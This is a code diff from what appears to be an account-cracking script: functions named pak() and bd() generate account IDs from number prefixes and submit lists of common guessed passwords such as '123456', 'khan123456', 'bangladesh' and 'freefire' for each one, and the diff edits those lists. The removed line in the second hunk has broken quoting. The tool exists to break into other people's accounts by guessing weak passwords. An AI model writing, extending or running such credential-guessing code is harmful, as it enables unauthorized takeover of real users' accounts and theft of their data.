@@ -335,7 +335,7 @@ def pak():
                         linex()                                                 
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'123456','1234567','12345678','123456789','khan123456','khankhan123','112233','786786']
+                                passlist = [psx,ids,'123456','1234567','12345678','123456789','khan123456','khankhan123','112233','786786','000000']
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -365,7 +365,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'123456','first+last, first+'123', first+'1234','first+'12345', 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire']
+                                passlist = [psx,ids,'123456','bangladesh','i love you','iloveyou','free fire','freefire','1234567','12345678','123456789']                                
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
